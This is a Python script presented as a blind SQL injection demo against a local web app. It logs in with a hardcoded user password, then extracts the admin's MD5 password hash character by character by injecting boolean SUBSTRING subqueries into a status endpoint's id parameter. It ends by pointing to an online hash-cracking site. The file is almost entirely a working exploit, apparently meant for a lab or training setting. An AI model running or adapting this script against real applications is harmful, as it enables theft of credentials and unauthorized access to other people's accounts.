#!/usr/bin/env python3
"""
Simple Blind SQL Injection Demo
Extracts admin password hash character by character
"""

import requests

# Configuration
BASE_URL = "http://localhost:5000"
TARGET_USER = "admin"

print("=" * 60)
print("  BLIND SQL INJECTION - Simple Demo")
print("=" * 60)
print()

# Step 1: Login as regular user
print("[1] Logging in as alice...")
session = requests.Session()
session.post(f"{BASE_URL}/login", data={
    "username": "alice",
    "password": "Welcome123!"
})
print("    ✓ Logged in\n")


# Step 2: Extract password hash
print(f"[3] Extracting password hash for '{TARGET_USER}'...")
print("    (This tests each character 0-9, a-f)\n")

hash_chars = "0123456789abcdef"
extracted_hash = ""

for position in range(1, 33):  # MD5 is 32 characters
    print(f"    Position {position:2d}: ", end="", flush=True)
    
    for char in hash_chars:
        # Build the SQL injection payload
        payload = f"1 AND (SELECT SUBSTRING(password_hash, {position}, 1) FROM users WHERE username='{TARGET_USER}') = '{char}'"
        url = f"{BASE_URL}/status?id={payload}"
        
        # Test if this character is correct
        response = session.get(url)
        
        # Check for TRUE signal (payment details shown)
        if "Payment Found" in response.text and "Payment ID:" in response.text:
            extracted_hash += char
            print(f"'{char}' ✓ → {extracted_hash}")
            break

print(f"[+] EXTRACTED HASH: {extracted_hash}")
print()
print("Next steps:")
print(f"  1. Crack hash at: https://crackstation.net/")
print()

